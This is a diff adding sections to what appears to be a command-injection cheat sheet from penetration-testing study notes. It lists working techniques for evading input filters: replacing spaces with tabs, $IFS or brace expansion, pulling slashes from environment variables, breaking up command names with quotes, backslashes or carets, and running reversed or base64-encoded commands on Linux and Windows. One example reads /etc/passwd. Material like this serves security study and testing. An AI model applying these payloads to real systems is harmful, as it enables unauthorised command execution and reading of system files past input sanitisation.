@@ -24,3 +24,74 @@ The only exception may be the semi-colon ;, which will not work if the command w
 | OR                 | `||`                | `%7c%7c`              | Second (only if first fails)             |
 | Sub-Shell          | `` `` ``            | `%60%60`              | Both (Linux-only)                        |
 | Sub-Shell          | `$( )`              | `%24%28%29`           | Both (Linux-only)                        |
+
+### 3) Bypassing Filters
+
+#### Space is blacklisted
+
+Use %09 (tab).
+
+Use $IFS
+
+Use Brace expansion i.e {ls,-la}
+
+#### / or \ are blacklisted
+
+Linux: use environment paths
+
+    to select /
+    echo ${PATH:0:1}
+
+Windows: use environment paths
+
+    to select \
+    $env:HOMEPATH[0]
+
+#### Commands are blacklisted
+
+General Solution: add Characters that are ignored by the shell.
+
+    ` or "
+    
+    Example: w'h'o'am'i
+
+
+Linux Only: add \ or $@
+
+    Examples:
+    - who$@ami
+    - w\ho\am\i
+
+
+Windows Only: add ^
+
+    Example:
+    - who^ami
+
+### 4) Reverse commands
+
+    # Linux
+    echo 'whoami' | rev
+    
+    # To execute:
+    $(rev<<<'imaohw')
+
+    # Windows
+    "whoami"[-1..-20] -join ''
+    
+    # To execute:
+    iex "$('imaohw'[-1..-20] -join '')"
+
+### 5) Encoded commands
+
+    # Linux
+    echo -n 'cat /etc/passwd | grep 33' | base64
+    
+    # To execute (note that we are using <<< to avoid using a pipe |, which is a filtered character):
+    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+    # Windows
+    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+    # To execute:
+    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
